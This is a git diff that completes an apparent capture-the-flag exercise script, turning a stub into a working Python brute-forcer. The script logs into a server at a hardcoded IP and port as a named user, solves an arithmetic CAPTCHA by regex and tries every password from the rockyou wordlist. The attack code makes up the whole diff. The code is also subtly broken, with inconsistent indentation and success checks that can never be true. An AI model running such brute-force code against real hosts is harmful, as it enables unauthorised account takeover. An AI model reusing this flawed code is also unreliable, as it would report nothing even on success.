@@ -25,9 +25,12 @@
 """
 
 import socket
+import re
+import operator
 
-host = "" # IP address here
-port = 0000 # Port here
+
+host = "157.230.179.99" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
@@ -54,12 +57,58 @@ def brute_force():
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
     """
+    file = open(wordlist,"r")
+    username = "ejnorman84"
+    regex = r"(?P<firstNum>(\d)*)\s(?P<op>([\+\-\*\/]))\s(?P<secNum>(\d)*)"
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+    for password in file:
+    	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    	s.connect((host, port))
+    	data = s.recv(1024)
+    	print("======data=====")
+    	print("|"+data+"|")
+    	print("======end=====")
+    	if data == "\n~~~ CAPTCHA ~~~\n" or data == "\n":
+    		s.send("\n")
+    		d1 = s.recv(1024)
+    	else:
+    		m = re.search(regex,data)
+         	firstNum = int(m.group('firstNum'))
+        	secNum = int(m.group('secNum'))
+        	op = m.group('op')
+        	print(firstNum)
+        	print(secNum)
+        	print(op)
+        	ops = { "+": operator.add, "-": operator.sub, "*": operator.mul, "/": operator.floordiv }
+            	res = str(ops[op](firstNum,secNum))
+        	print(res)
+        	s.send(res + "\n")
+        	d1 = s.recv(1024)
+        	
+        	if "Username" in d1 == False:
+    			print(d1)
+    			print("fail fail fail")
+    			return
+    	
+    	
+
+    	s.send(username + "\n")
+    	d2 = s.recv(1024)
+
+
+
+    	s.send(password + "\n")
+    	d3 = s.recv(1024)
+    	if "Fail" in d3 == False:
+    		print(d3)
+	    	print("password is: " + password)
+	    	return
+
+
 
 
 
 
 if __name__ == '__main__':
     brute_force()
+
